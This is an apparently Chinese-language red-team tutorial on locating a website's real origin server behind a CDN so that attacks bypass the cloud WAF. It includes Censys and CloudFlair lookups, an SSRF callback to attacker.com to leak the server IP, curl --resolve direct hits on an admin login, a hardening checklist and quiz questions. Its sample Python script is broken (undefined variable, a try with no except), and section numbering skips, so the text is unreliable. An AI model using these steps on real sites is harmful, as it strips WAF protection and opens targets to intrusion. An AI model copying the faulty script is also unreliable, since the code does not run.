# R04.2 CDN 邊緣節點歸屬與真實源站界限釐清 (CDN & Origin Disambiguation)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**CDN 邊緣節點歸屬與真實源站釐清 (Origin IP Disambiguation)** 的物理本質為**破除內容傳遞網路 (CDN: Cloudflare, Akamai, Fastly, CloudFront) 藉由 Anycast 全球共用節點所建立的「假性目標拓撲」，精準定位隱匿於反向代理後方之「真實源站 IP (Origin Server IP)」**。紅隊若直接對 CDN 邊緣節點發起滲透，不僅攻擊流量會被雲端 WAF 全數攔截，更可能因擊中共用節點而誤傷無關租戶；透過 SSL 歷史指紋、MX 郵件端點、子網域穿透或觸發出站 SSRF，紅隊可直接直連源站 IP，使邊界所有頂級 WAF 防護瞬間歸零。

```
[常規公網使用者] ──► DNS 解析指向 [Cloudflare Anycast IP (104.16.x.x)] ──► [雲端 WAF 攔截攻擊]
                                                                        │
[紅隊透過情資與指紋反查] ───────────────────────────────────────────────┘
  ├── 1. 檢索歷史 DNS 記錄 (A 記錄遷移前曾綁定之舊 IP)
  ├── 2. 檢索 MX 郵件主機 (mail.corp.com 與源站同屬一個 C 段)
  ├── 3. 觸發 SSRF 漏洞迫使伺服器向攻擊機發起回聯 (捕捉真實出口 IP)
  └── 4. Censys 檢索專屬 SSL 憑證指紋 (排除 Cloudflare 專屬 ASN)
                        │
                        ▼ 精準定位真實源站 IP: 198.51.100.25 (Origin Server)
[直連源站繞過 CDN] ────► curl --resolve target.corp:443:198.51.100.25 https://target.corp
                        │
                        ▼ 【完全繞過雲端 WAF 邊界防禦！】
[後端真實架構完全暴露] ──► 直接發起命令注入、SQLi 與未授權存取，達成秒級攻陷！
```

## 🔬 第一動：CDN Anycast 拓撲與源站隔離物理機制 (Mechanics & Edge Anycast)

### 1. CDN 代理節點 vs 真實源站物理特性對照表

| 架構特徵 | CDN / WAF 邊緣節點 (Edge) | 後端真實源站 (Origin Server) |
| :--- | :--- | :--- |
| **IP 路由機制** | **BGP Anycast** (全球數百資料中心廣播同一 IP) | **BGP Unicast** (單一實體機房或雲端 VPC 專屬位址) |
| **租戶共用性** | 數百萬個不同客戶共用同一組 Anycast IP | 目標企業獨立持有或專屬代管之實體/虛擬伺服器 |
| **防護能力** | 具備數百 Gbps 抗 DDoS 能力與動態 WAF 規則庫 | 通常缺乏深度防護，仰賴 CDN 作為盾牌 |
| **攻擊後果** | 封包被 WAF 攔截並觸發 CAPTCHA | **直接抵達後端應用代碼，防護能力降至最低** |

### 1. 核心源站尋找與直連繞過指令速查表 (CloudFlair / Censys / Curl)

```bash
# 1. 透過 Censys 檢索目標網域之 SSL 憑證，並排除 CDN 服務商 ASN
censys search "services.tls.certificates.leaf_data.subject.common_name: corp.internal and not autonomous_system.name: 'CLOUDFLARENET'" | jq -r '.[] | .ip'

# 2. 自動化比對目標站點 HTML 特徵與全網快照 (CloudFlair)
python3 cloudflair.py corp.internal --censys-api-id <ID> --censys-api-secret <SECRET>

# 3. 迫使目標伺服器觸發回聯外洩真實 IP (利用 SSRF 或頭像上傳功能)
# 於後端傳入攻擊機受控 URL:
http://attacker.com/ip_logger.php

# 4. 繞過 CDN 直連源站發起測試 (Curl --resolve 語意注入)
curl -v -k --resolve target.corp.internal:443:198.51.100.25 \
    https://target.corp.internal/admin/login
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **嚴格白名單防火牆鎖死 (Strict Origin IP Whitelisting)**：
   - 源站伺服器邊界防火牆（Security Groups / iptables）**僅允許 CDN 官方公開發布的 IP 網段連線**，外部公網直接連線一律直接丟棄 (DROP)。
2. **啟用雙向 TLS 認證 (Authenticated Origin Pulls)**：
   - 啟用 CDN 與源站之間的 mTLS 憑證認證；若未攜帶由 CDN 專屬私鑰簽發之用戶端憑證，源站直接拒絕 TLS 握手。
3. **收斂對外服務出口與郵件伺服器隔離**：
   - 禁止郵件伺服器 (MX)、VPN 服務與 Web 源站共用同一伺服器或同一公網出口 IP，防範因發送外發郵件洩漏源站。

### 1. 極簡 CDN 偽裝與源站直連模擬腳本 (Python, 20 行)

```python
import requests

origin_ip = "127.0.0.1"

print(f"[*] 嘗試繞過 CDN 直連真實源站: [{origin_ip}] 請求主機: [{domain_name}]")

# 利用 requests 自訂 Header 與 Host 標頭模擬 --resolve 行為
headers = {"Host": domain_name}
try:
    # 物理關鍵: 連線目標為本機 8888 埠 (源站)，但標頭傳入業務網域
    r = requests.get(f"http://{origin_ip}:8888/", headers=headers, timeout=2)
    print(f"[+] 🎯 成功直連源站！回應狀態碼: {r.status_code}")
    print(f"[+] 內容回顯: {r.text.strip()}")
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：當紅隊發現目標網域解析至 Cloudflare Anycast IP 時，直接掃描該 IP 會發生何事？**
  - **戰術思維**：掃描結果將**全數為 Cloudflare 自身的邊緣節點**，而非目標組織的實體主機；不僅發送的漏洞利用代碼會被 Cloudflare WAF 自動攔截並暫時拉黑攻擊機 IP，還可能誤傷同一個 Anycast IP 上的其他合法第三方網站。
- [ ] **Q2：為何觸發目標應用程式的「頭像抓取 / Webhook URL」常能瞬間抓出源站真實 IP？**
  - **戰術思維**：因為 Webhook 或圖片抓取功能是由**目標伺服器核心主動向外發起 HTTP 出站請求**。攻擊者只需提供自己控制的 Web 伺服器網址，並檢視存取日誌中的來源 IP，該來源 IP 即為目標後端的真實公網出口 IP。
- [ ] **Q3：在 Censys 中檢索真實源站時，為何必須排除目標所使用的 CDN 服務商 ASN？**
  - **戰術思維**：因為 CDN 邊緣伺服器通常也載入了目標的 SSL 憑證。若不排除 CDN 的 ASN（如 `AS13335 Cloudflare`），搜尋結果會被數千個 CDN 邊緣節點淹沒；排除後剩下的即為真實裝載該憑證的後端獨立伺服器。
- [ ] **Q4：何謂「Authenticated Origin Pulls」，其如何徹底粉碎源站直連攻擊？**
  - **戰術思維**：這是一種 CDN 與源站間的 **mTLS (雙向 TLS 認證)** 機制。源站伺服器要求連線者必須出示 Cloudflare 的客戶端證書；紅隊即使找到了真實源站 IP，若沒有合法的 CDN 客戶端私鑰，依然無法與源站建立 TLS 連線。
- [ ] **Q5：若源站已更換了全新 IP，歷史 DNS 記錄為何仍具備參考價值？**
  - **戰術思維**：許多企業在更換源站 IP 時，僅變更了最後兩碼，仍位於**同一個 C 段或同一網段自治系統 (ASN)** 之內；分析歷史 IP 能為紅隊縮小主機掃描的候選範圍。
